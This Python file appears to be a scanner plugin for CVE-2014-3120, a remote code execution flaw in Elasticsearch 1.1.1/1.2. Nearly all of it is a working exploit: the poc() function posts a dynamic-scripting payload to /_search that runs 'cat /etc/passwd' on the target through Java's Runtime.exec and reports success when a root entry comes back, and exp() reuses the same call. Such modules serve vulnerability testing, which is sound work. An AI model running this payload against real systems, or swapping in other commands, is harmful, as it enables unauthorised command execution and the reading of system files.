import requests
import re


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''ElasticSearch v1.1.1/1.2 RCE''',
        "description": '''The default configuration in Elasticsearch before 1.2 enables dynamic scripting, which allows remote attackers to execute arbitrary MVEL expressions and Java code via the source parameter to _search. Be aware this only violates the vendor's intended security policy if the user does not run Elasticsearch in its own independent virtual machine.''',
        "severity": "critical",
        "references": [
            "https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120", 
            "https://www.elastic.co/blog/logstash-1-4-3-released", 
            "https://nvd.nist.gov/vuln/detail/CVE-2014-3120"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "CVE-2014-3120",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2014", "elastic", "rce", "elasticsearch"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/_search?pretty"""
        method = "POST"
        data = {
            "size": 1,
            "query": {
            "filtered": {
                "query": {
                "match_all": {
                }
                }
            }
            },
            "script_fields": {
                "command": {
                    "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"cat /etc/passwd\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                }
            }
        }
        headers = {'Accept': '*/*', 'Accept-Language': 'en', 'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""application/json""" in str(resp0.headers)) and (re.search(r"""root:.*:0:0""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url